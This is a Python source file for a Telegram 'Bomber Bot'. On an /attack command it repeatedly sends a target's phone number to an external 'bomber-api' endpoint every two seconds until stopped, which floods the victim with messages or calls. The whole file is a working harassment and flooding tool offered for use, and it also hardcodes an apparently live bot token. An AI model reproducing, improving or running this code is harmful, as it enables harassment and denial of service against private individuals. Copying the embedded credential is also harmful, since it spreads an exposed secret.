import os
import requests
import logging
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
import asyncio
from datetime import datetime

# Bot Token - यही use करो
BOT_TOKEN = "8098475949:AAHZhzAivOXv2lN_GSSMjuP9hXSUHljStiY"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

active_attacks = {}
API_URL = "https://bomber-api-b65587ad9efc.herokuapp.com/start"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🚀 Bomber Bot Ready!\n/attack NUMBER - Start\n/stop - Stop")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    
    if chat_id in active_attacks:
        await update.message.reply_text("❌ Already attacking!")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /attack 8859027788")
        return
    
    phone = context.args[0]
    active_attacks[chat_id] = {'phone': phone, 'active': True}
    
    await update.message.reply_text(f"🚀 Attacking: {phone}")
    
    async def bomber():
        while chat_id in active_attacks and active_attacks[chat_id]['active']:
            try:
                resp = requests.post(API_URL, json={"phone": phone})
                time = datetime.now().strftime("%H:%M:%S")
                
                if resp.status_code == 200:
                    await update.message.reply_text(f"✅ {time} - Sent")
                else:
                    await update.message.reply_text(f"⚠️ {time} - Error: {resp.status_code}")
            except Exception as e:
                logger.error(f"Error: {e}")
            
            await asyncio.sleep(2)
    
    asyncio.create_task(bomber())

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in active_attacks:
        phone = active_attacks[chat_id]['phone']
        active_attacks[chat_id]['active'] = False
        del active_attacks[chat_id]
        await update.message.reply_text(f"🛑 Stopped: {phone}")
    else:
        await update.message.reply_text("❌ No attack running")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("stop", stop))
    print("Bot starting...")
    app.run_polling()

if __name__ == "__main__":
    main()
